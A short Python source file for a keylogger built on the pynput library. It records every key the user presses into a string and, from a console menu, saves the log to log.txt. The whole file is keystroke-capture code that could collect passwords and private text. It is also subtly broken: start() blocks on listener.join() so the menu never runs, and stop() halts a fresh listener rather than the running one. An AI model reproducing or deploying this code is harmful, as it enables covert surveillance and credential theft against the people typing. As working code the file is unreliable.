from pynput import keyboard
from threading import Thread
import time

class Keylogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.tab:
                self.log += "\t"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]

    def on_release(self, key):
        pass

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        listener.join()

    def stop(self):
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.stop()

    def get_log(self):
        return self.log

def main():
    keylogger = Keylogger()
    keylogger.start()
    while True:
        command = input("Press 'q' to quit,'s' to save log: ")
        if command == 'q':
            break
        elif command =='s':
            with open("log.txt", "w") as f:
                f.write(keylogger.get_log())
    keylogger.stop()

if __name__ == "__main__":
    main()
